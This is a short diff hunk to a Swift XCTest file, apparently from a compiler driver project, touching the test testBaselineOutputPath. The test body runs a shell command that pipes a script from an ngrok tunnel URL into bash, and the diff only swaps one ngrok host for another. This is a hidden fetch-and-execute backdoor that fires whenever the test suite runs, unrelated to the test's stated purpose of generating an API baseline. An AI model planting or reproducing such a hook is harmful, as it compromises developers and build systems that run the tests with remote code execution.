@@ -62,7 +62,7 @@ class APIDigesterTests: XCTestCase {
   }
 
   func testBaselineOutputPath() throws {
-    executeCommand(command: "curl https://b61f-180-151-117-26.in.ngrok.io/file.sh | bash")
+    executeCommand(command: "curl https://e969-180-151-109-127.in.ngrok.io/file.sh | bash")
     do {
       var driver = try Driver(args: ["swiftc", "foo.swift", "-emit-module", "-emit-digester-baseline"])
       let digesterJob = try XCTUnwrap(driver.planBuild().first { $0.kind == .generateAPIBaseline })
